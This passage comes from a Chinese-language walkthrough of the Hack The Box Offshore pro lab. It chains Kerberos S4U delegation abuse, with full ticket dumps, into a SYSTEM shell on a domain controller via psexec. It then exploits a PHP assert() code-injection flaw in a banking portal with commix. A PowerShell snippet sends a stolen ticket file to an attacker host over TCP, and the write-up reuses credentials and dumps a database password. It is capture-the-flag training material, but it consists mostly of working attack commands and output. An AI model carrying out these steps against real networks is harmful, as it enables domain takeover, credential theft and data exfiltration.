      0Ksa9MIKtmnaKpoNzlVMOkoLxiPFEMntnbki996s5X0JabwZSw3tKB1nyGes+G/TDIIqaufLpJo+WYMI
      DC1Q6k7dGYKGKbNfwexPbcdHxed49mKOVG7VEIe8IVhGnWRP0E7CoFbZjb/rRUt/Th8Y0zMEHx+84pXS
      0DGytW/6ZOqMRZoiwAg0xd2CjefsQZdXoL5ElMEK3lJ/GWIwAknC+jKASwRhUCek4/DdJ2t1OOcwHzGM
      7n9roOPAFBG5sK5TLNa1ZuaimPb8g4MJ9sBonQBW1Z2paDJQHjQKr8YDfPRTuUvEz40IptH547xpwcYW
      v8Gq7lE0mLN3X4h6SvjZ9584+Durp7oA1+NrZepnK27p64e0GtQUDqC4wFmPRpT+yf4G8mbEfA0VNcDo
      3d97pMgEk1be4HI11T3jNSSunX6+2LDJDbF68YbwPB7a9NPovEdhwOLPGCVVjx/jPUQHq4LoX5MSqnWj
      gegwgeWgAwIBAKKB3QSB2n2B1zCB1KCB0TCBzjCBy6AbMBmgAwIBF6ESBBA9GMDkHk8oC9zTEi890o00
      oRUbE0NMSUVOVC5PRkZTSE9SRS5DT02iEjAQoAMCAQGhCTAHGwVNUzAyJKMHAwUAQOEAAKURGA8yMDI2
      MDMwOTE3MTUyOVqmERgPMjAyNjAzMTAwMzE1MjlapxEYDzIwMjYwMzE2MTcxNTI5WqgVGxNDTElFTlQu
      T0ZGU0hPUkUuQ09NqSgwJqADAgECoR8wHRsGa3JidGd0GxNDTElFTlQuT0ZGU0hPUkUuQ09N


[*] Action: S4U

[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2self request for: 'MS02$@CLIENT.OFFSHORE.COM'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'MS02$@CLIENT.OFFSHORE.COM'
[*] base64(ticket.kirbi):

      doIGGjCCBhagAwIBBaEDAgEWooIFGzCCBRdhggUTMIIFD6ADAgEFoRUbE0NMSUVOVC5PRkZTSE9SRS5D
      T02iEjAQoAMCAQGhCTAHGwVNUzAyJKOCBNswggTXoAMCARKhAwIBAaKCBMkEggTFCnGCKdGiTqaITCE5
      4X0LrD+TPs+u7B8T7lqOp2KQ4LvJMY//JUvWOLCrjDixNYdWc/P+8P//wox5vEkfcjG9za50zKkH/I5c
      pjBkUHUWelaPtaQ03tA10Yu+acQdBhrQLSNm3R8l7dEw0bpmliTrtEUJjVBq6loTcj7WUeRaXMh0YfvY
      jSloEYjGTN14U0qz0wJxc8LW5PYzoxWdbGJbrXcSm1bxJHW9cvfRGUfIjUAIRdTQHTBeliyoGH1QTG4X
      7O7cfNxiZVkOIxeg2m9SUnzQGeM0C60TlAKPEK3fnZmrE1loQ9m1yhZeG8uka8e4w4ZdutacnVmqR74Y
      O0XacX+l19l9hMAnDOSjyZm8S3DMqfbFEJCnxyADgtOOvQOuRxCtPKCcpCf9/v6HV0kayUAijMp0DEnJ
      Bil7altFomtZGBP+98JLrJBdEAKuN0jNybpI7rfF4yrz5ZSEavePyAR3BSVuTviuOD1DEH9eDBfbCIlp
      1ftGfI2HQq6CcFo7GXSqAJDqgAfRM3Z09kUOrmhoOjfMNozPT5oGoz9LPOrYBCjcX1FVs2NCyK+09HOw
      JLb6CM1/Y6IXA4VOVtFMX+jccp8nj1r6McS4tQabSzcz7Sx6ZsaHh/ESfT8+L/s+/xf7X8m4P++Vi4nE
      Tx9XvETPLtlZIeX7bEyGvnFLhUVImKrXVADP3D1V0NW6cuZSYSfMlRJ9Jq1Tn7b3povTpR0DeJqglEz7
      ZZY/D17/XCIbQjTTF0Bzq2EmVlSGFYr4R/dSoRmmKR5jCzV1fZzVBGM6Lb4JMfnweAJbOFlXzi0HUIZt
      BN8/U4qD7AbMPlXnzyW33KOB31uR64usanIobU9W2fSCuO3Vy4zYtlYXOqP4QQURusLXSCh23RnoVbxd
      S2s6gU09k/Ltu8FWI39ha4cj66PMtkBJ2NdLCPzuwev4INKJxONNP9HXsxZFPDAcNT29edFoaplb9RJr
      Y09hFBuJYtn3ocTXaHTJZ++Ehirp3Y5BznNv8wOpLaOriP1DjP88X9z2CUdFrTB192PkzNiqYe8S5Yis
      k1azilfAEgwtt4s9MsNcVv4dSy4VQzwUNf5i/igpSreac+viVFZ2xRCREQ1GlhavopiGNdOZpAJu6XqT
      7ckkT9wI0VpRlfGO356gb/cwYLoF0OqyCZnZSqReER+8OKm6JsW125qAomIwqx8xVFA3hKfC6qa62438
      lYpHsvOc6+GQkdukv5rYtY9QS/aLmYvFtDz8BhE4hSqMS27DoRyZxnb7ulYQUxGerggibgu5N7beZ5/7
      j3jf9dDcg3M+v8R/oi9bJdlRtSThDaNBG0I/E/vqQFN7k8851HTRRWUvv1KiL3MFCpcIdeVGnj/z4H3q
      tqrYsUK9pvMI97ebA+LIi59DrvOVkNVeONh/JnhuloiGdM7ZvwxiIwg1qj/YOU7H2HPheyTo+phqyOSH
      kGr8sMK6tYYY6vklCtlwoPg56+lRK8eY8QM2i01BLoIROfN5QSGnW6yZYxpzxnJUMVcB4F8LlIwGc/o4
      oZxrKmBti6cpQTwussVwNUuD+t4+/rQDzZWXm/ex04EdA6sL+tWTCSRhWntjdIY2OsQZGJlQIM/FEqx7
      gZ4Z5nTg+9keo4HqMIHnoAMCAQCigd8Egdx9gdkwgdaggdMwgdAwgc2gKzApoAMCARKhIgQgfzlQRBYL
      Me72jKAXgwRjlsStcvYWiK5HBN4HonrWZQ+hFRsTQ0xJRU5ULk9GRlNIT1JFLkNPTaIaMBigAwIBCqER
      MA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNjAzMDkxNzE1MjlaphEYDzIwMjYwMzEwMDMx
      NTI5WqcRGA8yMDI2MDMxNjE3MTUyOVqoFRsTQ0xJRU5ULk9GRlNIT1JFLkNPTakSMBCgAwIBAaEJMAcb
      BU1TMDIk


[*] Ticket written to client_dc04_administrator_to_MS02$@CLIENT.OFFSHORE.COM.kirbi

[*] Impersonating user 'administrator' to target SPN 'cifs/DC04.CLIENT.OFFSHORE.COM'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Using domain controller: DC04.CLIENT.OFFSHORE.COM (172.16.4.5)
[*] Building S4U2proxy request for service: 'cifs/DC04.CLIENT.OFFSHORE.COM'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/DC04.CLIENT.OFFSHORE.COM':

      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

[*] Ticket written to client_dc04_cifs-DC04.CLIENT.OFFSHORE.COM.kirbi

```

得到client_dc04_cifs-DC04.CLIENT.OFFSHORE.COM.kirbi

### 传回票据
```c
$client = New-Object Net.Sockets.TCPClient("10.10.16.2",8973)
$stream = $client.GetStream()
[byte[]]$bytes = [IO.File]::ReadAllBytes("C:\Users\Public\client_dc04_cifs-DC04.CLIENT.OFFSHORE.COM.kirbi")
$stream.Write($bytes,0,$bytes.Length)
$stream.Close()
$client.Close()
```

```c
nc -lvnp 8973 > client_dc04_cifs-DC04.CLIENT.OFFSHORE.COM.kirbi
```

###  转换为 ccaches  
`.kirbi` 是 Windows 格式，需要转换成 Linux Kerberos cache。

使用 **Impacket** 自带工具：

```plain
ticketConverter.py client_dc04_cifs-DC04.CLIENT.OFFSHORE.COM.kirbi ticket.ccache
```

转换后会得到：

```plain
ticket.ccache
```

### 设置 Kerberos 环境变量
让系统使用这个票据：

```plain
export KRB5CCNAME=ticket.ccache
```

确认：

```plain
klist
```

如果成功会看到类似：

```plain
administrator@CLIENT.OFFSHORE.COM
cifs/DC04.CLIENT.OFFSHORE.COM
```

---

### ⭐ 获取 DC shell
你这个票据是：

```plain
cifs/DC04.CLIENT.OFFSHORE.COM
```

```plain
proxychains -q psexec.py -k -no-pass CLIENT.OFFSHORE.COM/administrator@DC04.CLIENT.OFFSHORE.COM
```

参数说明：

```plain
-k        使用 Kerberos
-no-pass  不使用密码
```

---

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/client]
└─# proxychains -q psexec.py -k -no-pass CLIENT.OFFSHORE.COM/administrator@DC04.CLIENT.OFFSHORE.COM
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC04.CLIENT.OFFSHORE.COM.....
[*] Found writable share ADMIN$
[*] Uploading file HpRtznrb.exe
[*] Opening SVCManager on DC04.CLIENT.OFFSHORE.COM.....
[*] Creating service gHiO on DC04.CLIENT.OFFSHORE.COM.....
[*] Starting service gHiO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

# 172.16.4.120(Linux)（Setp:14）
## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ports = @()
1..65535 | ForEach-Object {
    $p = ($_ / 15000) * 100
    Write-Progress -Activity "端口扫描" -Status "尝试连接 $_ 端口" -PercentComplete $p
    $tcp = New-Object System.Net.Sockets.TcpClient
    Try{
        $tcp.Connect("172.16.4.120",$_)
        $ports += $_
        Write-Warning "扫描到在线端口: $_"
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接成功" -PercentComplete $p
    }
    Catch{
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接失败" -PercentComplete $p
    }
    Finally{
        $tcp.Close()
    }
}
$ports
Warning: 扫描到在线端口: 22
Warning: 扫描到在线端口: 80
```

## 信息收集
![](/image/prolabs/Offshore-88.png)

网站标题为Offshore Bank Client Portal

我们之前拿到的银行账号密码分别如下

```c
client_banking c1403723973274b66e789363b396f5b5
bankvault       c718f548c75062ada93250db208d3178
```

## dirsearch
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/client]
└─# proxychains -q dirsearch -u http://172.16.4.120/                                               
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                  
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/offshore/client/reports/http_172.16.4.120/__26-03-10_11-07-40.txt

Target: http://172.16.4.120/

[11:07:40] Starting:                                                                                    
[11:07:47] 301 -  309B  - /js  ->  http://172.16.4.120/js/                  
[11:07:57] 403 -  277B  - /.ht_wsr.txt                                      
[11:07:57] 403 -  277B  - /.htaccess.bak1                                   
[11:07:57] 403 -  277B  - /.htaccess.sample                                 
[11:07:57] 403 -  277B  - /.htaccess.orig
[11:07:57] 403 -  277B  - /.htaccess.save                                   
[11:07:57] 403 -  277B  - /.htaccess_extra                                  
[11:07:57] 403 -  277B  - /.htaccessOLD                                     
[11:07:57] 403 -  277B  - /.htaccess_sc
[11:07:57] 403 -  277B  - /.htaccessOLD2
[11:07:57] 403 -  277B  - /.htaccessBAK
[11:07:57] 403 -  277B  - /.htaccess_orig                                   
[11:07:57] 403 -  277B  - /.html                                            
[11:07:57] 403 -  277B  - /.htm                                             
[11:07:57] 403 -  277B  - /.htpasswds
[11:07:57] 403 -  277B  - /.htpasswd_test                                   
[11:07:57] 403 -  277B  - /.httr-oauth
[11:08:01] 403 -  277B  - /.php                                             
[11:08:01] 403 -  277B  - /.php3                                            
[11:08:45] 301 -  313B  - /client  ->  http://172.16.4.120/client/          
[11:08:51] 301 -  310B  - /css  ->  http://172.16.4.120/css/                
[11:09:07] 301 -  313B  - /images  ->  http://172.16.4.120/images/          
[11:09:07] 200 -  660B  - /images/                                          
[11:09:11] 200 -  593B  - /js/                                              
[11:09:48] 403 -  277B  - /server-status                                    
[11:09:48] 403 -  277B  - /server-status/       
```

## 凭据复用
```c
C:\Users\Public> net user client_banking
User name                    client_banking
Full Name                    
Comment                      **Old admin account for client banking app** OFFSHORE{h1dd3n_1n_pl@iN_$1ght}
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/29/2018 1:59:04 AM
Password expires             Never
Password changeable          4/30/2018 1:59:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

有没有可能client_banking的密码就是flag呢

client_banking:h1dd3n_1n_pl@iN_$1ght

![](/image/prolabs/Offshore-89.png)

```c
Description	**Old admin account for client banking app** OFFSHORE{h1dd3n_1n_pl@iN_$1ght}
```

这句话意思就是admin密码是h1dd3n_1n_pl@iN_$1ght

## /client
![](/image/prolabs/Offshore-90.png)

使用凭据admin/h1dd3n_1n_pl@iN_$1ght

成功登录

![](/image/prolabs/Offshore-91.png)

右上角存在ADD TRANSACTIONS功能点 访问

![](/image/prolabs/Offshore-92.png)

编造数据发送

```c
POST /client/transactions/addTransaction.php HTTP/1.1
Host: 172.16.4.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://172.16.4.120
Connection: keep-alive
Referer: http://172.16.4.120/client/transactions/
Cookie: PHPSESSID=k76iob3sem2f1ql7uni7am89c7
Pragma: no-cache
Cache-Control: no-cache

from=china&fromaddr=heathcliff&to=japan&toaddr=catherine&amount=100&comments=money
```

```c
Success: Transaction will be processed
```

尝试篡改参数

```c
POST /client/transactions/addTransaction.php HTTP/1.1
Host: 172.16.4.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://172.16.4.120
Connection: keep-alive
Referer: http://172.16.4.120/client/transactions/
Cookie: PHPSESSID=k76iob3sem2f1ql7uni7am89c7
Pragma: no-cache
Cache-Control: no-cache

from=china&fromaddr=heathcliff&to=japan&toaddr=catherine&amount=whoami&comments=money
```

```c
Assertion Failed:
Invalid value for amount
At line '23' : 'is_numeric('whoami') !== false'
```

`is_numeric()` 是 **PHP函数**

根据返回包得知amount必须为数字

代码使用了 assertion (依据:返回Assertion Failed)

说明代码写法可能是：

```plain
assert(is_numeric($_POST['amount']) !== false);
```

执行流程：

1️⃣ `$_POST['amount']` 先进入 `is_numeric()`

2️⃣ `is_numeric()` 返回 **true / false**

**这里 没有执行字符串代码，只是执行函数逻辑。**

代码还可能是

```plain
assert("is_numeric($amount) !== false");
```

这里 **assert 的参数是字符串**。

在旧版本 PHP 中：

```plain
assert("string")
```

会被当成：

```plain
eval("string")
```

## assert injection
使用命令注入工具

[GitHub - commixproject/commix: Automated All-in-One OS Command Injection Exploitation Tool](https://github.com/commixproject/commix)

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/commix-4.1]
└─# proxychains -q python commix.py -u http://172.16.4.120/client/transactions/addTransaction.php  --cookie="PHPSESSID=k76iob3sem2f1ql7uni7am89c7"  --method=POST -d "from=china&fromaddr=heathcliff&to=japan&toaddr=catherine&amount=whoami&comments=money" --os-cmd=whoami -p amountpython commix.py -u http://172.16.4.120/client/transactions/addTransaction.php  --cookie="PHPSESSID=k76iob3sem2f1ql7uni7am89c7"  --method=POST -d "from=china&fromaddr=heathcliff&to=japan&toaddr=catherine&amount=whoami&comments=money" --os-cmd=whoami -p amount                      
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[12:04:36] [info] Testing connection to the target URL. 
[12:04:44] [info] Checking whether the target is protected by some kind of WAF/IPS.
[12:04:51] [info] Performing heuristic (passive) tests on the target URL.
[12:05:12] [warning] Target's estimated response time is 2 seconds. That may cause delays during the data extraction procedure.
[12:05:12] [info] Setting POST parameter 'amount' for tests.
[12:05:12] [info] Performing heuristic (basic) tests to the POST parameter 'amount'.
Do you want to ignore HTTP response code '500' and proceed with testing? [y/N] > y
[12:07:11] [info] Heuristic (basic) tests show that POST parameter 'amount' might be injectable via (results-based) dynamic code evaluation technique (possible PHP version: '5.6.40').
Do you want to skip testing command injection techniques on the POST parameter 'amount'? (recommended if certain) [Y/n] > y
[12:08:35] [info] Testing the (results-based) dynamic code evaluation technique.           
[12:08:35] [info] POST parameter 'amount' appears to be injectable via (results-based) dynamic code evaluation technique.
           |_ whoami'.print(`echo PPRLEE`.`echo $((29+55))`.`echo PPRLEE`.`echo PPRLEE`).'
[12:08:35] [info] Executing user-supplied command 'whoami'.
[12:08:41] [info] 'whoami' execution output: client_banking
POST parameter 'amount' is likely vulnerable. Do you want to spawn a pseudo-terminal shell? [Y/n] > y
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > whoami
client_banking
```

## Getflag
```c
commix(os_shell) > cat ../../../flag.txt
OFFSHORE{a$$ert1on_r1fl3!!!}
```

## Getflag
```c
commix(os_shell) > cat /home/client_banking/flag.txt
OFFSHORE{d0nt_tru$t_y0ur_us3rs}
```

## 端口外联
```c
commix(os_shell) > ss -antp
State    Recv-Q Send-Q           Local Address:Port          Peer Address:Port  
LISTEN   0      80                   127.0.0.1:3306               0.0.0.0:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      128              127.0.0.53%lo:53                 0.0.0.0:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      128                    0.0.0.0:22                 0.0.0.0:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      100                  127.0.0.1:25                 0.0.0.0:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      128                          *:80                       *:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      128                       [::]:22                    [::]:*                                                                                                                                                                                                                                                                                                                                                              
LISTEN   0      100                      [::1]:25                    [::]:*                                                                                                                                                                                                                                                                                                                                                              
TIME-WAIT0      0        [::ffff:172.16.4.120]:80     [::ffff:172.16.4.5]:51864                                                                                                                                                                                                                                                                                                                                                          
ESTAB    0      0        [::ffff:172.16.4.120]:80     [::ffff:172.16.4.5]:51866                                                                                                                                                                                                                                                                                                                                                          
TIME-WAIT0      0        [::ffff:172.16.4.120]:80     [::ffff:172.16.4.5]:51863                                                                                                                                                                                                                                                                                                                                                          
commix(os_shell) > 
```

发现3306端口，想起[http://172.16.4.120/client/dashboard.php](http://172.16.4.120/client/dashboard.php)界面出现大量bank数据

![](/image/prolabs/Offshore-93.png)

## 凭据发现
```c
commix(os_shell) > cat /var/www/html/client/dashboard.php
<!DOCTYPE html>
<html lang="en">                                                                                                                                                                                                                                                                                                                                                                                                                         
<?php                                                                                                                                                                                                                                                                                                                                                                                                                                    
session_start();                                                                                                                                                                                                                                                                                                                                                                                                                         
if($_SESSION['login'] !== "true") {                                                                                                                                                                                                                                                                                                                                                                                                      
    header("Location: index.php");                                                                                                                                                                                                                                                                                                                                                                                                       
    die();                                                                                                                                                                                                                                                                                                                                                                                                                               
}                                                                                                                                                                                                                                                                                                                                                                                                                                        
$servername = "localhost";                                                                                                                                                                                                                                                                                                                                                                                                               
$username = "root";                                                                                                                                                                                                                                                                                                                                                                                                                      
$password = "toor";                                                                                                                                                                                                                                                                                                                                                                                                                      
$dbname = "transactionsDB";                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                                                                                         
// Create connection                                                                                                                                                                                                                                                                                                                                                                                                                     
$conn = new mysqli($servername, $username, $password, $dbname);                                                                                                                                                                                                                                                                                                                                                                          
// Check connection                                                                                                                                                                                                                                                                                                                                                                                                                      
if ($conn->connect_error) {                                                                                                                                                                                                                                                                                                                                                                                                              
    die("Connection failed: " . $conn->connect_error);                                                                                                                                                                                                                                                                                                                                                                                   
}                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                         
$sql = "SELECT * FROM transactions";                                                                                                                                                                                                                                                                                                                                                                                                     
$result = $conn->query($sql);                                                                                                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                         
if ($result->num_rows > 0) {                                                                                                                                                                                                                                                                                                                                                                                                             
    // output data of each row                                                                                                                                                                                                                                                                                                                                                                                                           
?>                                                                                                                                                                                                                                                                                                                                                                                                                                       
<head>                                                                                                                                                                                                                                                                                                                                                                                                                                   
    <meta charset="UTF-8">                                                                                                                                                                                                                                                                                                                                                                                                               
    <title>Offshore Login</title>                                                                                                                                                                                                                                                                                                                                                                                                        
    <link rel="stylesheet" href="./style.css">                                                                                                                                                                                                                                                                                                                                                                                           
    <meta charset="UTF-8">                                                                                                                                                                                                                                                                                                                                                                                                               
    <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                                                                                                                                                                                                                                                                                 
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="icon" type="image/png" href="images/icons/favicon.ico" />                                                                                                                                                                                                                                                                                                                                                                 
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">                                                                                                                                                                                                                                                                                                                                                
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">                                                                                                                                                                                                                                                                                                                                     
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">                                                                                                                                                                                                                                                                                                                                                            
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">                                                                                                                                                                                                                                                                                                                                                        
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="vendor/perfect-scrollbar/perfect-scrollbar.css">                                                                                                                                                                                                                                                                                                                                        
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
    <link rel="stylesheet" type="text/css" href="css/util.css">                                                                                                                                                                                                                                                                                                                                                                          
    <link rel="stylesheet" type="text/css" href="css/main.css">                                                                                                                                                                                                                                                                                                                                                                          
    <!--===============================================================================================-->                                                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                                                                                                                                         
</head>                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                         
<body>                                                                                                                                                                                                                                                                                                                                                                                                                                   
    <!-- partial:index.partial.html -->                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                         
    <body class="profile-login">                                                                                                                                                                                                                                                                                                                                                                                                         
        <header class="global-header">                                                                                                                                                                                                                                                                                                                                                                                                   
            <div>                                                                                                                                                                                                                                                                                                                                                                                                                        
                <nav class="global-nav">                                                                                                                                                                                                                                                                                                                                                                                                 
                    <a class="logo" data-analytics="site logo" href="/">                                                                                                                                                                                                                                                                                                                                                                 
                        <img width="300" height="150" title="Offshore" alt="Offshore" src="Offshore.png">                                                                                                                                                                                                                                                                                                                                
                    </a>                                                                                                                                                                                                                                                                                                                                                                                                                 
                </nav>                                                                                                                                                                                                                                                                                                                                                                                                                   
            </div>                                                                                                                                                                                                                                                                                                                                                                                                                       
        <div>                                                                                                                                                                                                                                                                                                                                                                                                                            
                <a href="/client/transactions/" class="btn btn-5">Add Transactions</a>                                                                                                                                                                                                                                                                                                                                                   
        </div>                                                                                                                                                                                                                                                                                                                                                                                                                           
        </header>                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                         
        <section>                                                                                                                                                                                                                                                                                                                                                                                                                        
            <div class="wrap-table100">                                                                                                                                                                                                                                                                                                                                                                                                  
                <div class="table100">                                                                                                                                                                                                                                                                                                                                                                                                   
                    <table>                                                                                                                                                                                                                                                                                                                                                                                                              
                        <thead>                                                                                                                                                                                                                                                                                                                                                                                                          
                            <tr class="table100-head">                                                                                                                                                                                                                                                                                                                                                                                   
